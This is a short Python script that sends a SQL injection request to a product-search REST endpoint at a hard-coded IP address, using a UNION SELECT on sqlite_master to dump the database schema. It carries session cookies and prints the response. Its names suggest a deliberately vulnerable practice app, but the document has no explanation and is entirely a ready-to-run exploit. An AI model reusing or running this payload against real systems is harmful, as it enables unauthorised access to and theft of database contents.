from urllib.request import urlopen, Request
from urllib.parse import quote
from pprint import pprint
from json import load

response = urlopen(
    Request(
        f"""http://15.236.144.183:8082/rest/products/search?q={quote("banana'))UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--")}""",
        headers={
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "http://15.236.144.183:8082",
            "Referer": "http://15.236.144.183:8082/",
            "Cookie": (
                "language=en; welcomebanner_status=dismiss;"
                " continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
                "TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
                "_status=dismiss"
            ),
        },
    )
)
pprint(load(response))